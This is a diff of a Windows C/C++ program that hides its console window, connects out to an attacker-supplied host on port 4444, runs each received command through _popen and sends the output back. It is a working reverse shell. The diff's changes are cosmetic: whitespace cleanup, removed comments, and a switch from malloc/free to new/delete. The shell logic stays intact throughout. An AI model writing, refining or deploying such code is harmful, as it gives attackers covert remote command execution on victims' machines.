@@ -3,13 +3,13 @@
 #include <string.h>
 #include <winsock2.h>
 #include <windows.h>
-#include <ws2tcpip.h> 
+#include <ws2tcpip.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
 void hideConsole() {
-    HWND hwnd = GetConsoleWindow(); 
-    ShowWindow(hwnd, SW_HIDE);    
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
 }
 
 int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
@@ -28,8 +28,9 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _
 
     struct sockaddr_in server;
     server.sin_family = AF_INET;
-    server.sin_port = htons(4444); // Enter port
-                            // Enter IP/Hostname
+    server.sin_port = htons(4444); 
+
+    
     if (InetPton(AF_INET, "<IP/Hostname>", &server.sin_addr) <= 0) {
         closesocket(sock);
         WSACleanup();
@@ -42,12 +43,13 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _
         return 1;
     }
 
-    char* buffer = (char*)malloc(65536 * sizeof(char));
-    char* sendBuffer = (char*)malloc(65536 * sizeof(char));
-    if (buffer == NULL || sendBuffer == NULL) {
+    
+    char* buffer = new char[65536];
+    char* sendBuffer = new char[65536];
+    if (buffer == nullptr || sendBuffer == nullptr) {
         closesocket(sock);
         WSACleanup();
-        return 1; 
+        return 1;
     }
 
     int bytesRead;
@@ -55,11 +57,9 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _
     while ((bytesRead = recv(sock, buffer, 65535, 0)) > 0) {
         buffer[bytesRead] = '\0';
 
-        FILE* fp;
-
-        fp = _popen(buffer, "r");
-        if (fp == NULL) {
-            strcpy_s(sendBuffer, 65536, "Error executing command\n");
+        FILE* fp = _popen(buffer, "r");
+        if (fp == nullptr) {
+            snprintf(sendBuffer, 65536, "Error executing command\n");
             send(sock, sendBuffer, (int)strlen(sendBuffer), 0);
             continue;
         }
@@ -71,8 +71,9 @@ int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _
         _pclose(fp);
     }
 
-    free(buffer);
-    free(sendBuffer);
+    
+    delete[] buffer;
+    delete[] sendBuffer;
 
     closesocket(sock);
     WSACleanup();
